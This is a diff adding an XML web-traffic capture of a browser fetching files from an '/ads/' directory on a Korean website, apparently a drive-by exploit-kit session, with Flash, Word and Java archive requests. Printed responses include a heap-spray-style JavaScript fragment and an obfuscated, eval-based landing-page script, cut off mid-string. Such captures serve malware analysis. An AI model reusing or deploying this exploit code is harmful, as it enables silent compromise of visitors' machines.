+			<lastCacheUpdate>2017-01-19T02:04:52</lastCacheUpdate>
+			<lastAccess>2017-01-19T02:04:53.763</lastAccess>
+			<eTag>&quot;19c0d84-3150-5465edbf59c0f&quot;</eTag>
+			<hitCount>2</hitCount>
+		</afterRequest>
+	</cache>
+	<timings>
+		<cache_read started="0.000">0.000</cache_read>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/logo.swf">
+	<pageref idref="page_0" />
+	<started>00:00:00.374</started>
+	<startedDateTime>2017-01-19T11:04:53.977</startedDateTime>
+	<time>0.080</time>
+	<sent>311</sent>
+	<received>422</received>	<result>404</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/logo.swf</action>
+		<action name="Started At" status="Completed">2017-Jan-19 11:04:53.977 (local time)</action>
+		<action name="HTTP Request" status="Completed">Unconditional request sent for http://www.joongohwamoolcha.com/ads/logo.swf</action>
+		<action name="HTTP Response" status="Completed">Headers and content returned</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/logo.swf HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">*/*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko-KR</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="Referer">http://www.joongohwamoolcha.com/ads/YrGaEs.html</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+			<header name="x-flash-version">15,0,0,152</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 404 Not Found</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Content-Length">210</header>
+			<header name="Content-Type">text/html; charset=iso-8859-1</header>
+			<header name="Date">Thu, 19 Jan 2017 02:04:52 GMT</header>
+			<header name="Keep-Alive">timeout=15, max=98</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+		</headers>
+		<content>
+			<contentLength>210</contentLength>
+			<text><![CDATA[
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">.<html><head>.<title>404 Not Found</title>.</head><body>.<h1>Not Found</h1>.<p>The requested URL /ads/logo.swf was not found on this server.</p>.</body></html>.
+]]></text>
+			<mimeType>text/html; charset=iso-8859-1</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>false</URLInCache>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>false</URLInCache>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.020</blocked>
+		<send started="0.020">0.000</send>
+		<wait started="0.020">0.059</wait>
+		<receive started="0.080">0.000</receive>
+		<ttfb started="0.020">0.060</ttfb>
+		<network started="0.020">0.060</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/ww.html">
+	<pageref idref="page_1" />
+	<started>00:36:18.147</started>
+	<startedDateTime>2017-01-19T11:41:11.750</startedDateTime>
+	<time>0.105</time>
+	<sent>304</sent>
+	<received>5501</received>	<result>200</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/ww.html</action>
+		<action name="Started At" status="Completed">2017-Jan-19 11:41:11.750 (local time)</action>
+		<action name="DNS Lookup" status="Completed">Lookup of hostname &apos;www.joongohwamoolcha.com&apos;</action>
+		<action name="Connect" status="Completed">Connect to IP address &apos;211.115.80.22&apos;</action>
+		<action name="HTTP Request" status="Completed">Unconditional request sent for http://www.joongohwamoolcha.com/ads/ww.html</action>
+		<action name="HTTP Response" status="Completed">Headers and content returned</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/ww.html HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 200 OK</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Content-Length">5289</header>
+			<header name="Content-Type">text/html</header>
+			<header name="Date">Thu, 19 Jan 2017 02:41:11 GMT</header>
+			<header name="Keep-Alive">timeout=15, max=100</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+			<header name="X-Powered-By">PHP/4.4.9</header>
+		</headers>
+		<content>
+			<contentLength>5289</contentLength>
+			<mimeType>text/html</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>false</URLInCache>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>true</URLInCache>
+			<lastCacheUpdate>2017-01-19T02:41:12</lastCacheUpdate>
+			<lastAccess>2017-01-19T02:41:11.890</lastAccess>
+			<eTag></eTag>
+			<hitCount>1</hitCount>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.090</blocked>
+		<dns_lookup started="0.090">0.001</dns_lookup>
+		<connect started="0.091">0.007</connect>
+		<send started="0.099">0.000</send>
+		<wait started="0.099">0.005</wait>
+		<receive started="0.105">0.000</receive>
+		<ttfb started="0.090">0.014</ttfb>
+		<network started="0.090">0.015</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/ww.js">
+	<pageref idref="page_1" />
+	<started>00:36:18.259</started>
+	<startedDateTime>2017-01-19T11:41:11.862</startedDateTime>
+	<time>0.003</time>
+	<sent>272</sent>
+	<received>524</received>	<result>200</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/ww.js</action>
+		<action name="Started At" status="Completed">2017-Jan-19 11:41:11.862 (local time)</action>
+		<action name="HTTP Request" status="Completed">Unconditional request sent for http://www.joongohwamoolcha.com/ads/ww.js</action>
+		<action name="HTTP Response" status="Completed">Headers and content returned</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/ww.js HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">*/*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="Referer">http://www.joongohwamoolcha.com/ads/ww.html</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 200 OK</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept-Ranges">bytes</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Content-Length">224</header>
+			<header name="Content-Type">application/javascript</header>
+			<header name="Date">Thu, 19 Jan 2017 02:41:11 GMT</header>
+			<header name="ETag">&quot;19c0dd4-e0-5465edd597d87&quot;</header>
+			<header name="Keep-Alive">timeout=15, max=99</header>
+			<header name="Last-Modified">Wed, 18 Jan 2017 14:02:18 GMT</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+		</headers>
+		<content>
+			<contentLength>224</contentLength>
+			<text><![CDATA[
+      try {..            new ActiveXObject("");..      }..      catch (e) {..var Vlewa8="BODY";..var fihdIKH0='%'+'u'+'9'+'\x30'+'\x39'+WufP2;..fihdIKH0+=fihdIKH0;..var SKYqg8="%u";..var zwGe8=unescape;..//var PLqFC2="x";..}
+]]></text>
+			<mimeType>application/javascript</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>false</URLInCache>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>true</URLInCache>
+			<lastModification>2017-01-18T14:02:18</lastModification>
+			<lastCacheUpdate>2017-01-19T02:41:12</lastCacheUpdate>
+			<lastAccess>2017-01-19T02:41:11.900</lastAccess>
+			<eTag>&quot;19c0dd4-e0-5465edd597d87&quot;</eTag>
+			<hitCount>1</hitCount>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.000</blocked>
+		<send started="0.000">0.000</send>
+		<wait started="0.000">0.003</wait>
+		<receive started="0.003">0.000</receive>
+		<ttfb started="0.000">0.003</ttfb>
+		<network started="0.000">0.003</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/ww.swf">
+	<pageref idref="page_1" />
+	<started>00:36:18.553</started>
+	<startedDateTime>2017-01-19T11:41:12.156</startedDateTime>
+	<time>0.020</time>
+	<sent>415</sent>
+	<received>1255</received>	<result>206</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/ww.swf</action>
+		<action name="Started At" status="Completed">2017-Jan-19 11:41:12.156 (local time)</action>
+		<action name="Connect" status="Completed">Connect to IP address &apos;211.115.80.22&apos;</action>
+		<action name="HTTP Request" status="Completed">Unconditional request sent for http://www.joongohwamoolcha.com/ads/ww.swf</action>
+		<action name="HTTP Response" status="Completed">Headers and content returned</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/ww.swf HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">*/*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko-KR</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="If-Range">&quot;19c0dd6-385-5465eddb09a4f&quot;</header>
+			<header name="Range">bytes=0-</header>
+			<header name="Referer">http://www.joongohwamoolcha.com/ads/ww.html</header>
+			<header name="Unless-Modified-Since">Wed, 18 Jan 2017 14:02:23 GMT</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+			<header name="x-flash-version">15,0,0,152</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 206 Partial Content</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept-Ranges">bytes</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Content-Length">901</header>
+			<header name="Content-Range">bytes 0-900/901</header>
+			<header name="Content-Type">application/x-shockwave-flash</header>
+			<header name="Date">Thu, 19 Jan 2017 02:41:11 GMT</header>
+			<header name="ETag">&quot;19c0dd6-385-5465eddb09a4f&quot;</header>
+			<header name="Keep-Alive">timeout=15, max=100</header>
+			<header name="Last-Modified">Wed, 18 Jan 2017 14:02:23 GMT</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+		</headers>
+		<content>
+			<contentLength>901</contentLength>
+			<mimeType>application/x-shockwave-flash</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>false</URLInCache>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>true</URLInCache>
+			<lastModification>2017-01-18T14:02:23</lastModification>
+			<lastCacheUpdate>2017-01-19T02:41:14</lastCacheUpdate>
+			<lastAccess>2017-01-19T02:41:12.210</lastAccess>
+			<eTag>&quot;19c0dd6-385-5465eddb09a4f&quot;</eTag>
+			<hitCount>1</hitCount>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.000</blocked>
+		<connect started="0.000">0.011</connect>
+		<send started="0.012">0.003</send>
+		<wait started="0.015">0.004</wait>
+		<receive started="0.020">0.000</receive>
+		<ttfb started="0.000">0.019</ttfb>
+		<network started="0.000">0.020</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/ww.doc">
+	<pageref idref="page_1" />
+	<started>00:36:18.626</started>
+	<startedDateTime>2017-01-19T11:41:12.229</startedDateTime>
+	<time>0.006</time>
+	<sent>304</sent>
+	<received>3251</received>	<result>200</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/ww.doc</action>
+		<action name="Started At" status="Completed">2017-Jan-19 11:41:12.229 (local time)</action>
+		<action name="HTTP Request" status="Completed">Unconditional request sent for http://www.joongohwamoolcha.com/ads/ww.doc</action>
+		<action name="HTTP Response" status="Completed">Headers and content returned</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/ww.doc HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">*/*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko-KR</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="Referer">http://www.joongohwamoolcha.com/ads/ww.swf</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+			<header name="x-flash-version">15,0,0,152</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 200 OK</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept-Ranges">bytes</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Content-Length">2953</header>
+			<header name="Content-Type">application/msword</header>
+			<header name="Date">Thu, 19 Jan 2017 02:41:11 GMT</header>
+			<header name="ETag">&quot;19c0dd0-b89-5465edcb0dd8f&quot;</header>
+			<header name="Keep-Alive">timeout=15, max=99</header>
+			<header name="Last-Modified">Wed, 18 Jan 2017 14:02:07 GMT</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+		</headers>
+		<content>
+			<contentLength>2953</contentLength>
+			<mimeType>application/msword</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>false</URLInCache>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>true</URLInCache>
+			<lastModification>2017-01-18T14:02:07</lastModification>
+			<lastCacheUpdate>2017-01-19T02:41:14</lastCacheUpdate>
+			<lastAccess>2017-01-19T02:41:12.270</lastAccess>
+			<eTag>&quot;19c0dd0-b89-5465edcb0dd8f&quot;</eTag>
+			<hitCount>1</hitCount>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.002</blocked>
+		<send started="0.002">0.000</send>
+		<wait started="0.002">0.003</wait>
+		<receive started="0.006">0.000</receive>
+		<ttfb started="0.002">0.004</ttfb>
+		<network started="0.002">0.004</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/LrNwXx.jar">
+	<pageref idref="page_2" />
+	<started>00:54:32.537</started>
+	<startedDateTime>2017-01-19T11:59:26.140</startedDateTime>
+	<time>0.123</time>
+	<sent>307</sent>
+	<received>5895</received>	<result>200</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/LrNwXx.jar</action>
+		<action name="Started At" status="Completed">2017-Jan-19 11:59:26.140 (local time)</action>
+		<action name="DNS Lookup" status="Completed">Lookup of hostname &apos;www.joongohwamoolcha.com&apos;</action>
+		<action name="Connect" status="Completed">Connect to IP address &apos;211.115.80.22&apos;</action>
+		<action name="HTTP Request" status="Completed">Unconditional request sent for http://www.joongohwamoolcha.com/ads/LrNwXx.jar</action>
+		<action name="HTTP Response" status="Completed">Headers and content returned</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/LrNwXx.jar HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 200 OK</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept-Ranges">bytes</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Content-Length">5603</header>
+			<header name="Content-Type">text/plain</header>
+			<header name="Date">Thu, 19 Jan 2017 02:59:25 GMT</header>
+			<header name="ETag">&quot;19c0d80-15e3-5465edb7bf76f&quot;</header>
+			<header name="Keep-Alive">timeout=15, max=100</header>
+			<header name="Last-Modified">Wed, 18 Jan 2017 14:01:46 GMT</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+		</headers>
+		<content>
+			<contentLength>5603</contentLength>
+			<mimeType>text/plain</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>false</URLInCache>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>false</URLInCache>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.098</blocked>
+		<dns_lookup started="0.098">0.001</dns_lookup>
+		<connect started="0.099">0.015</connect>
+		<send started="0.115">0.000</send>
+		<wait started="0.115">0.006</wait>
+		<receive started="0.122">0.000</receive>
+		<ttfb started="0.098">0.024</ttfb>
+		<network started="0.098">0.024</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/IhTrFx.jar">
+	<pageref idref="page_3" />
+	<started>00:54:41.025</started>
+	<startedDateTime>2017-01-19T11:59:34.628</startedDateTime>
+	<time>0.029</time>
+	<sent>307</sent>
+	<received>4756</received>	<result>200</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/IhTrFx.jar</action>
+		<action name="Started At" status="Completed">2017-Jan-19 11:59:34.628 (local time)</action>
+		<action name="HTTP Request" status="Completed">Unconditional request sent for http://www.joongohwamoolcha.com/ads/IhTrFx.jar</action>
+		<action name="HTTP Response" status="Completed">Headers and content returned</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/IhTrFx.jar HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 200 OK</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept-Ranges">bytes</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Content-Length">4465</header>
+			<header name="Content-Type">text/plain</header>
+			<header name="Date">Thu, 19 Jan 2017 02:59:33 GMT</header>
+			<header name="ETag">&quot;19c0b35-1171-5465ed9bdff77&quot;</header>
+			<header name="Keep-Alive">timeout=15, max=99</header>
+			<header name="Last-Modified">Wed, 18 Jan 2017 14:01:17 GMT</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+		</headers>
+		<content>
+			<contentLength>4465</contentLength>
+			<mimeType>text/plain</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>false</URLInCache>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>false</URLInCache>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.022</blocked>
+		<send started="0.022">0.001</send>
+		<wait started="0.023">0.005</wait>
+		<receive started="0.029">0.000</receive>
+		<ttfb started="0.022">0.006</ttfb>
+		<network started="0.022">0.007</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/EwReMw.jar">
+	<pageref idref="page_4" />
+	<started>00:54:47.370</started>
+	<startedDateTime>2017-01-19T11:59:40.973</startedDateTime>
+	<time>0.028</time>
+	<sent>307</sent>
+	<received>4388</received>	<result>200</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/EwReMw.jar</action>
+		<action name="Started At" status="Completed">2017-Jan-19 11:59:40.973 (local time)</action>
+		<action name="HTTP Request" status="Completed">Unconditional request sent for http://www.joongohwamoolcha.com/ads/EwReMw.jar</action>
+		<action name="HTTP Response" status="Completed">Headers and content returned</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/EwReMw.jar HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 200 OK</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept-Ranges">bytes</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Content-Length">4097</header>
+			<header name="Content-Type">text/plain</header>
+			<header name="Date">Thu, 19 Jan 2017 02:59:40 GMT</header>
+			<header name="ETag">&quot;19c0b31-1001-5465ed9500337&quot;</header>
+			<header name="Keep-Alive">timeout=15, max=98</header>
+			<header name="Last-Modified">Wed, 18 Jan 2017 14:01:10 GMT</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+		</headers>
+		<content>
+			<contentLength>4097</contentLength>
+			<mimeType>text/plain</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>false</URLInCache>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>false</URLInCache>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.021</blocked>
+		<send started="0.021">0.000</send>
+		<wait started="0.022">0.005</wait>
+		<receive started="0.028">0.000</receive>
+		<ttfb started="0.021">0.006</ttfb>
+		<network started="0.021">0.007</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/ads/YrGaEs.html">
+	<pageref idref="page_5" />
+	<started>00:54:56.097</started>
+	<startedDateTime>2017-01-19T11:59:49.700</startedDateTime>
+	<time>0.034</time>
+	<sent>308</sent>
+	<received>10977</received>	<result>200</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/ads/YrGaEs.html</action>
+		<action name="Started At" status="Completed">2017-Jan-19 11:59:49.700 (local time)</action>
+		<action name="HTTP Request" status="Completed">Unconditional request sent for http://www.joongohwamoolcha.com/ads/YrGaEs.html</action>
+		<action name="HTTP Response" status="Completed">Headers and content returned</action>
+	</overview>
+	<request>
+		<requestMethod>GET /ads/YrGaEs.html HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 200 OK</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Content-Type">text/html</header>
+			<header name="Date">Thu, 19 Jan 2017 02:59:48 GMT</header>
+			<header name="Keep-Alive">timeout=15, max=97</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+			<header name="Transfer-Encoding">chunked</header>
+			<header name="X-Powered-By">PHP/4.4.9</header>
+		</headers>
+		<content>
+			<contentLength>10740</contentLength>
+			<text><![CDATA[
+<script type="text/javascript" src="swfobject.js"></script>..<script type="text/javascript">..var xmPpPuD='@@@@@@@@@@var@out@@str@@len@charCodeAt@case@@length@@c3@if@@return@@@c4@@@@@@0xff@@@sum@while@break@c2@String@0xffffffff@@mx@nbChar@c1@char2@63@function@do@ErTiUlaxlkP@@AVgHbu2f@fromCharCode@X3cQCMIIF@for@char3@join@str2long@delta@61@vl@@@@@@@@@@@BMOYPRD4H@0x3F@6b@GIEMslIELDjE@NtCion@false@key@65@74@KeY@long2str@utf8to16@itVm_snY3@sl@nbcode@nbencode@0x1F@S4WgrK1gLEl9A1ljTz5UxGMs5GSS2vDYYtpjcX9ExI5aPwDPEdnBxkYoPiL07O9JJVmodDXHMYF7AaFQ9sTWqL0R0Y8Zb@asqRoElblRBLFNyBNmTOy3TNuFp4d@charAt@lcjDJW078jCc82l5CAwacmEDtwTk3hkvmXwvwhceogX61LvvOvvBhnXpcLTM4j2NiBSZXItNvVOv@switch@sLyX@awnBZGy0A4BIHZCTrB6Jg0QOy0avQjexMeuvYmDQ5iZlSwWIhZHygWUs3F3R6ukaA1rI101e2tvyLJ@rtgI@77@72@69@qKhFFn02c@8ZiJs02D@0x3C@mCha@fro@a5j0UWMkjKNAtYWfFEpt14pgu0cPjwVvqdXjQi0r5NSIc2trPO86I9Hj@rCode@v5DhRuurAr2d20LxyAWeI9F0lJsDMyTZhbGReFx6Jw7TGwFIOLq@else@substring@window@0XF@0x30@de@harCo@omC@0x0F@new@60@62@Array@fr@qVpmcfI37@bRuP9k3lON@@@@@@@@@@@kyq2ywLIq7swKWRuLwax@jf@OQnsWIVyORshmM2Hs6Ch7vYEDJt2cW127BQoc8htI8MrVZu50rJRkcnpkMBnz@SjtQ8XdEbgA2E6dnVMesuYhc5frkj2Rdjvtwy@UIqJBDc70RnBUN48BIlzGmjrLy6R8vu6Pj0ZaS@5EiL876q83DWete8rkQVkWM2j8dam5dvZlRCKZH5xe9SsLHauCzRhmEluEDzWCUtWMQ8lfa1dp@EZXJo84DNwnioREUsgD@0nUXYgflS11ZFXSoroaFNBWhwqK5t5KoHIsj5M1RkHpiwUy2GGpr3aHhTQSCILzA1rSE2wwI56XR3pBA@HFNuxLO3CqcUAQFTbNxj9Igats3h5tiEHYMi2oquX4Key8kWrv@kmyMRkvbroXiX3gNUL@c3NSanK@TCHXtWjzcm3tTmJSw0IlBtvAN0DerL2Gd728s9LMtKHUnNdFW5vlqmvTn2JADpEfTR7cg2j4BaQggpdqyeeUdpLER8Ux@tB@el8juVI3G40l6z@ypPyZBj@n9kV8Z@fx0R8vGyUM8K5nA0@6f@75@6d@64@cap@eval@nes@6e@9t1wX23LT5iZL@gcA0@uB@QBTrFkyoi06obmGqyI@wzhax18NNFVOAj3AkjWugvKIkTKv0x6O0v7dsBmQSy9Sbdib36zoGXZhLXMqArYYxWRycrWTN6Yn1Upswa2o5ATXqJXmGBGM22oLkwZ@RFd6ys@zMBC6SYAaqJ9Wq29L6LjQvvsNzOqyrnebG@vbIp8Qluzg24VfBSUZpV9kTjjWJl7747oox2VJlRkRxqsQkRe0UEvLN8go2n8QQeb2kISOsknI08bqUSS92015KLEIWiHyxGSpDAZglivboIK1BpM1uTwzQ42BZSE3Rph2gDwc2vtIauG4frU5wgto@VXVZ9q2gIn@n5MYr0iPvdHQcMg2jX55WM9r@GoHt2echEVYcHspuHYC3nn@snAHC@ehYqXcJ5RwAvMg9i6PwXqiTx7FoziSFWZ@biWizYqeZ1FzeyIOWLnYoUvqHov@olaw7PNr1xAGgaJrOxPractXlBCGUsvW@razSElGTQRdFPUC2YnVvuZaCNg4sutloW@aZS142PDQ0Qru58aTWyfPnfCdLRYdgOlHxA78MARo5jwW0R3@Bgu5mxM9HNI@N65bAAcHz6F0unj90EsMD3qr@ql24bnTJmFitTyBXAFEKedjxY25Wl4sw6k88DHeSw9gnQEUGufPFcbkLTOy8POrsUjPLFAgm2O4rHEg1Jbqlm8gzTGk55vppsPTKz2l08N3biDFstOLuZImAHRNA94607kwDTEkACBd42hSXWIjPXCh63uInHoDT3woJflVPb6h@a10hPDMgrbY@MfQbrWgNI28QzacyADom3I4ZsWz961pbGm6MoWDccb6A@SS90Qp3ans1kBedn@YiiF2rlEkJgbK6pebuQWS9kUZV4t8JHPpWZYteah18n93Jw9Jrau@UJCh3pyODX2K5bAtHYfjXNsj2jOyXr8ac8T7u@jyZWJDzNWvGeoPLgpGtH@tzKpdavHBrHBkHTIkZcTl@@@@@@@@@@@mDamfkxOozeBz249JLpHSfsP4a2X110sxZPqdHZUCLXRBNha61rztKrN@ycNNISch4zVeEiFkpkhGRcnJlsqS0sjz1B91JvWeOzWAtC6a6hEhpMtSg9usYvmJ3EI2dDKowVXad5khU622hTnXWovWylTsB1ceoF1fB5FLCKJ0A2LpYdm3RmIXqSpIwmsmxTlSVchy@hAXjxvRvvS6Dv4FhZYJ7GQsAyR1qVGdlp2DqsBEKznbD1PVltl2gWEtTevf372d541n0hZShiCR4@MPc03Ord3c1BtC6MoJCVPw@Bl1nuUrBCZBxpvSjaltox5EMoC1rUjyEX8AlEk9z2UOCvgjhd9UuCy8HRmCQ8ud7yzAcyeWIu@ejIS2AqfkrtnLEvFVVoxJ80bTFNZQoBl@ke5UdwGsGooeI1CFVGirz2fN6yujLBDcN0SczgKcc5609CU@Lcu62x2La@QwwRGP1HfEHPO9Bnh17rGrR93k7SUlG8veYuT39UMcAKsmZDynLpoM6AISq0MrzNQsdQnyDN2MP21Vj4ICQOY6ZdZm3RvvHmEe2f6eVDGS96npqp@oCI2chHTXcevqypL8F32OioSHf2dSq@aiVbZIBrnfYYVey0tssBefJzqhtazThph71Ybq02s3SFX4UnSD4bsssTjTz@FZ6RJZiFrBNI4E2m48fXy8urdzCqQtSlOJf@rBkHbTNsex7mMOt